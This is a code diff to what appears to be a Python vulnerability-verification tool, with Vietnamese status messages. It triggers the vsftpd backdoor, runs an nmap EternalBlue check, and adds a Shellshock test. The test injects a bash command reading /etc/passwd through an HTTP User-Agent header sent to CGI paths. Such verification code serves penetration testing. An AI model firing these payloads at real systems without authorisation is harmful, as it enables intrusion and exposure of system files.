@@ -1,6 +1,7 @@
 import socket
 import subprocess
 import time
+import requests
 
 def check_port(ip, port, timeout=3):
     try:
@@ -26,7 +27,6 @@ def verify_vsftpd_backdoor(target_ip):
         s.send(b"PASS x\r\n")
         s.close()
         time.sleep(2)
-
         result = check_port(target_ip, 6200)
         if result == "open":
             return {"status": "CONFIRMED", "evidence": "port_6200_open", "severity": "Critical"}
@@ -41,8 +41,7 @@ def verify_smb_eternalblue(target_ip):
     print(f"[*] Verify EternalBlue trên {target_ip}...")
     try:
         result = subprocess.run([
-            "nmap", "--script", "smb-vuln-ms17-010",
-            "-p", "445", target_ip
+            "nmap", "--script", "smb-vuln-ms17-010", "-p", "445", target_ip
         ], capture_output=True, text=True, timeout=30)
         if "VULNERABLE" in result.stdout:
             return {"status": "CONFIRMED", "evidence": "smb_vuln_ms17_010", "severity": "Critical"}
@@ -51,9 +50,32 @@ def verify_smb_eternalblue(target_ip):
     except Exception as e:
         return {"status": "ERROR", "reason": str(e)}
 
+def verify_shellshock(target_ip):
+    print(f"[*] Verify Shellshock trên {target_ip}...")
+    try:
+        headers = {
+            "User-Agent": "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"
+        }
+        urls = [
+            f"http://{target_ip}/cgi-bin/test.cgi",
+            f"http://{target_ip}/cgi-bin/status",
+            f"http://{target_ip}/cgi-bin/bash"
+        ]
+        for url in urls:
+            try:
+                r = requests.get(url, headers=headers, timeout=5)
+                if "root:" in r.text:
+                    return {"status": "CONFIRMED", "evidence": f"passwd leak via {url}", "severity": "Critical"}
+            except:
+                continue
+        return {"status": "FALSE_POSITIVE", "reason": "no_cgi_endpoint_vulnerable"}
+    except Exception as e:
+        return {"status": "ERROR", "reason": str(e)}
+
 VERIFY_MAP = {
     "tcp_port_6200": verify_vsftpd_backdoor,
     "nmap_smb_script": verify_smb_eternalblue,
+    "http_header_inject": verify_shellshock,
 }
 
 def run_verify(verify_method, target_ip):
